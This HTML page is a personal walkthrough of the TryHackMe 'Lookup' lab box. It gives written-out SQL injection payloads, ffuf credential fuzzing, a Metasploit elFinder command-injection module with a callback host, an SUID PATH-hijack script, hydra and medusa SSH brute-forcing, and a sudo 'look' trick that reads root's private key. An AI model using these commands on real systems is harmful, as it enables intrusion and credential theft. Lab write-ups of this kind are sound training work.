<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Nal Chhen — Lookup Box (Write-up)</title>
  <meta name="author" content="Nal Chhen">
  <meta name="description" content="TryHackMe Lookup Box — step-by-step write-up by Nal Chhen">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="/assets/Angkor.ico">
  <meta name="theme-color" content="#14213d">
  <link rel="stylesheet" href="/css/styles.css">
</head>
<body>

    <nav>
    <a href="/index.html">NAL</a>
    <a href="">Write-ups</a>
    <a href="/#projects">Projects</a>
    <a href="/#about">About</a>
    <a href="/#contact">Contact</a>
    </nav>


  <main>
    <header>
      <h1>Lookup Box</h1>
      <p class="muted">2025-09-01 14:52 &nbsp;•&nbsp; web / ffuf / burp / metasploit / privesc</p>
    </header>

    <!-- optional hero image -->
    <figure>
      <img src="/img/lookup/hero1.webp" alt="Lookup Box overview (placeholder)">
    </figure>

    <article class="writeup nopre">

      <h2>first test for connectivity</h2>
      <figure>
        <img class="img-70" src="/img/lookup/im2.webp" alt="Ping target IP">
        <figcaption>i ping the given IP — connection all good</figcaption>
      </figure>

      <h2>Nmap scan for Open ports</h2>
      <figure>
        <img class="img-70" src="/img/lookup/img6.webp" alt="Nmap running">
        <figcaption>while nmap is running i try to open the IP to the browser</figcaption>
      </figure>

      <figure>
        <img class="img-70" src="/img/lookup/im4.webp" alt="Browser error before hosts entry">
        <figcaption>there is a domain name = <code>lookup.thm</code></figcaption>
      </figure>

      <p>so i go to config the hosts of the ip for it to be able to open <br>(to be able to talk with the DNS)</p>
      <p>&rarr; <b>nano or vim /etc/hosts/</b></p>

      <figure>
        <img class="img-70" src="/img/lookup/im5.webp" alt="Editing /etc/hosts">
        <figcaption class="cap-one-line cap-wide">after add the ip to its domain name for the DNS, when i refresh its show a login page !!!</figcaption>
      </figure>

        <img class="img-70" src="/img/lookup/im7.webp" alt="Editing /etc/hosts">


      <h3>Nmap result</h3>
      <figure>
        <img src="/img/lookup/im3.webp" alt="Nmap results show ports">
        <figcaption>2 ports are open after scan — <b>http (80)</b> and <b>ssh (22)</b></figcaption>
      </figure>

      <p>im stuckkk here @.@</p>
      <p>but i ran a gobuster in the background maybe i found something more</p>

      <figure>
        <img src="/img/lookup/im8.webp" alt="Gobuster">
        <figcaption>gobuster running</figcaption>
      </figure>

      <p>&gt; Interestingly !!! when i ffuf it i found something !!</p>
      <figure>
        <img src="/img/lookup/im9.webp" alt="ffuf initial findings">
        <figcaption>but status code is not 200 so cant really open it but we can know there is something</figcaption>
      </figure>

      <p>and then i try use feroxbuster to scan again</p>
      <figure>
        <img src="/img/lookup/im10.webp" alt="feroxbuster finds login.php">
        <figcaption>interestingly i found a <code>login.php</code></figcaption>
      </figure>

      <p>then i try to burpsuit it</p>

     <figure>
    <img class="zoomable" src="/img/lookup/im11.webp"
        data-full="/img/lookup/im11_big.webp"
        alt="Burp intercepts login.php request">
    <figcaption>burp repeater set up</figcaption>
    </figure>

    <!-- side-by-side works too; both are zoomable -->
    <div class="fig-row">
    <figure><img class="zoomable" src="/img/lookup/im11.webp" alt="Req"></figure>
    <figure><img class="zoomable" src="/img/lookup/im12.webp" alt="Resp"></figure>
    </div>


      <p>first of all i try some of the basic SQL like</p>
      <pre class="cmd">admin'1 OR '1'='1 -- &amp;password
admin'1 OR '1'='1 # &amp;password
admin' OR '1'='1 --password
admin' OR  1=1 -- password
username=' OR 'a'='a&amp;password=test
username=' OR '1'='1'/*&amp;password=anything
username=1' OR 1=1 -- &amp;password=anything</pre>

      <figure>
        <img src="/img/lookup/im13.webp" alt="No SQLi">
        <figcaption>&gt; nothing interesting</figcaption>
      </figure>

      <p>so i try generic or just general admin or root</p>

      <p>&gt; something interesting here</p>
      <figure>
        <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/im14.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/im15.webp" alt="Resp"></figure>
        </div>

    <figcaption>
    I first tried a username with the same length (5 characters), such as <code>admia</code>, and used any password of equal length, like <code>testt</code>.  
    When I switched the username to <code>admin</code>, the response changed — it only reported a wrong password. This suggests that <code>admin</code> is a valid username, while <code>admia</code> triggers an error indicating both fields are invalid.  
    I also noticed the <code>Content-Length</code> in the responses is different.
    </figcaption>


      <pre class="cmd">ffuf -w /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
  -X POST -u http://lookup.thm/login.php \
  -d "username=FUZZ&amp;password=abbb" \
  -H "Content-Type: application/x-www-form-urlencoded"</pre>

        
      <p>Now i start fuzzing for possible passwords for the user <code>admin</code>. </p>

      <figure>
        <img src="/img/lookup/im16.webp" alt="ffuf password fuzzing admin">
        <figcaption>&gt; the pass i found <b>password123</b></figcaption>
      </figure>

     <p>Then I tried BurpSuite again.</p>
    <p>But somehow the password didn’t work for <code>admin</code>? So I changed the password a bit to test.</p>

    <figure>
    <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/im17.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/im18.webp" alt="Resp"></figure>
    </div>
    <figcaption >
        Using the password with the <code>admin</code> user gives the generic error as before.<br>
        But if I change or delete just one letter in the password, the response switches back to “wrong password.”  
    </figcaption>
    </figure>

    <p>So here I think the username <code>admin</code> is valid,</p>
    <p>but the password for that username might not be correct.</p>
    <p>Because when I tested the password found by ffuf. <br> - First i try used password123 with user admin. it said “both wrong.” <br><br> But if I try password12 (missing one char) <br> - the output changes to just “wrong password.”</p>

    <figure>
    <img src="/img/lookup/im19.webp" alt="ffuf usernames using found password">
    <figcaption>
        Then I tried <code>ffuf</code> again with the password I found and fuzzed the usernames.  
        Got a 302 redirect for <code>jose</code> with <code>password123</code> → valid credential pair.
    </figcaption>
    </figure>


      <p>and then i try to use what we got the username jose and the pass password123 to try to login into the page</p>
      
      <figure>
         <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/im20.webp" alt="Login Sucess"></figure>
        <figure><img class="zoomable" src="/img/lookup/im21.webp" alt="Resp"></figure>
        </div>
        <figcaption>interestingly it redirect to another page name <code>files.lookup.thm</code> so we add this to <code>/etc/hosts</code></figcaption>
      </figure>

      <figure>
        <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/im22.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/im23.webp" alt="Resp"></figure>
        </div>
        <figcaption>after refresh the website its show like a file manager system?? <br> a bit of google i found out its <b>elFinder</b> (open-source web application file manager)</figcaption>
      </figure>

      <p>tbh i kinda idk what to do here next i look into the repo and stuff and then i try google elfinder exploit. saw some interesting link and existing CVE for elfinder. maybe this version is old too?? so i try to go find the version on the site</p>

      <figure>
        <img src="/img/lookup/im24.webp" alt="elFinder about/version">
        <figcaption>in the about here we can see its version <b>2.1.47</b></figcaption>
      </figure>

       <figure>
        <img src="/img/lookup/im25.webp" alt="elFinder about/version">
        <figcaption>we found the exact exploit for the vuln yayyyy (elfinder 2.1.47 command injection)</figcaption>
      </figure>

      <h2>metasploit foothold</h2>

        <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/IM26.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/im27.webp" alt="Resp"></figure>
        </div>

      <pre class="cmd">msfconsole
    search elfinder
    use exploit/multi/http/elfinder_php_connector_exiftran_cmd_injection
    set RHOSTS files.lookup.thm
    set LHOST &lt;your_kali_ip&gt;
    exploit</pre>

      <figure>
        <img src="/img/lookup/im28.webp" alt="Meterpreter www-data">
        <figcaption>After running <code>getuid</code>, we have a shell as <b>www-data</b>!!!</figcaption>
      </figure>

      <h2>Privilege Escalation Enumeration</h2>
      <p>After getting a shell as <code>www-data</code>, i checked <code>/etc/passwd</code> and found <code>root</code>, <code>think</code>, <code>ssm-user</code>, <code>ubuntu</code>…</p>
      <figure><img class="zoomable" src="/img/lookup/im29.webp" alt="Req"></figure>

      <p>Next, i explored the user directories. In <code>/home/think</code> i found an interesting file called <b>.passwords</b> but i don’t have permission to read it.</p>

      <figure>
        <img src="/img/lookup/im30.webp" alt="/home/think/.passwords exists">
        <figcaption>okay, if i can’t read it directly, maybe privesc via SUID can help</figcaption>
      </figure>

      <pre class="cmd">find / -perm -4000 2>/dev/null</pre>
      <figure>
        <img src="/img/lookup/im31.webp" alt="find SUID results">
        <figcaption>one entry stands out: <code>/usr/sbin/pwm</code> (not a default SUID)</figcaption>
      </figure>

      <figure>
        <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/32.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/33.webp" alt="Resp"></figure>
        </div>

        <figcaption>running it shows it calls <code>id</code> and then tries <code>/home/&lt;username&gt;/.passwords</code></figcaption>
      </figure>

      <h3>PATH hijack to dump think’s passwords</h3>
      <p>the binary doesn’t use an absolute path for <code>id</code>, so we hijack with our own script that says we are <code>think</code>:</p>
      <pre class="cmd">export PATH=/tmp:$PATH
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
chmod +x /tmp/id
/usr/sbin/pwm     # now it reads /home/think/.passwords</pre>

      <figure>
        <img src="/img/lookup/34.webp" alt="Dumped passwords content">
        <figcaption>password list dumped — save it and try brute force user back on my Vm</figcaption>
      </figure>

      <h2>get user think</h2>
      <pre class="cmd"># pick your tool:
hydra -l think -P think_pass.txt ssh://lookup.thm
# or:
medusa -h lookup.thm -u think -P think_pass.txt -M ssh</pre>

      <figure>
        <div class="fig-row equal">
        <figure><img class="zoomable" src="/img/lookup/35.webp" alt="Req"></figure>
        <figure><img class="zoomable" src="/img/lookup/36.webp" alt="Resp"></figure>
        </div>
        <figcaption>Success! ssh as <code>think</code> — user flag <br> Note : User flag can be found here :D</figcaption>
      </figure>

      <h2>think → root with sudo look</h2>
      <pre class="cmd">sudo -l
# shows allowed: (ALL) /usr/bin/look
sudo /usr/bin/look '' /root/.ssh/id_rsa</pre>

      <figure>
        <img src="/img/lookup/ssh.webp" alt="Root SSH key dumped">
        <figcaption>dump root’s private key, copy to kali, set perms, ssh as root</figcaption>
      </figure>

      <pre class="cmd">chmod 600 root_key
ssh -i root_key root@lookup.thm</pre>

      <figure>
        <img src="/img/lookup/root.webp" alt="Root shell and flag">
        <figcaption>we in ! got the root flag and done :D</figcaption>
      </figure>

      <h2>References</h2>
      <ul>
        <li><a class="external" href="https://github.com/Studio-42/elFinder" target="_blank" rel="noopener">elFinder repo</a></li>
        <li><a class="external" href="https://pentest-tools.com/vulnerabilities-exploits/elfinder-2147-command-injection_27343" target="_blank" rel="noopener">elFinder 2.1.47 cmd injection</a></li>
        <li><a class="external" href="https://gtfobins.github.io/gtfobins/look/" target="_blank" rel="noopener">GTFOBins — look</a></li>
      </ul>

    </article>
  </main>

  <footer>
    (cc) Attribution-ShareAlike 4.0 International<br>
    © <span id="year"></span> Nal Chhen
  </footer>

  <!-- non-jumping close target for lightbox -->
  <a id="lb-close" class="lb-close-anchor" aria-hidden="true"></a>

  <!-- Lightbox overlays -->
  <a href="#lb-close" class="lightbox" id="im11" aria-label="Close image">
    <img src="/img/lookup/im11.webp" alt="Burp intercepts login.php request — full size">
    <span class="close" aria-hidden="true">×</span>
  </a>

  <a href="#lb-close" class="lightbox" id="im12" aria-label="Close image">
    <img src="/img/lookup/im12.webp" alt="Repeater response — full size">
    <span class="close" aria-hidden="true">×</span>
  </a>

  <!-- Image modal overlay -->
    <div id="imgModal" class="img-modal" role="dialog" aria-modal="true" aria-label="Image preview" aria-hidden="true">
    <button type="button" class="img-modal__close" aria-label="Close">×</button>
    <img class="img-modal__img" alt="">
    </div>

    <script>
    (function () {
    const modal    = document.getElementById('imgModal');
    const modalImg = modal.querySelector('.img-modal__img');
    const closeBtn = modal.querySelector('.img-modal__close');

    function openModal(src, alt){
        modalImg.src = src;
        modalImg.alt = alt || '';
        modal.classList.add('open');
        modal.setAttribute('aria-hidden','false');
        document.body.classList.add('no-scroll');
    }
    function closeModal(){
        modal.classList.remove('open');
        modal.setAttribute('aria-hidden','true');
        modalImg.src = '';
        document.body.classList.remove('no-scroll');
    }

    // click on any .zoomable image
    document.querySelectorAll('img.zoomable').forEach(img=>{
        img.addEventListener('click', ()=>{
        openModal(img.dataset.full || img.src, img.alt);
        });
    });

    // close: X button, click backdrop, or Esc
    closeBtn.addEventListener('click', closeModal);
    modal.addEventListener('click', e => { if (e.target === modal) closeModal(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
    })();
    </script>

</body>
</html>
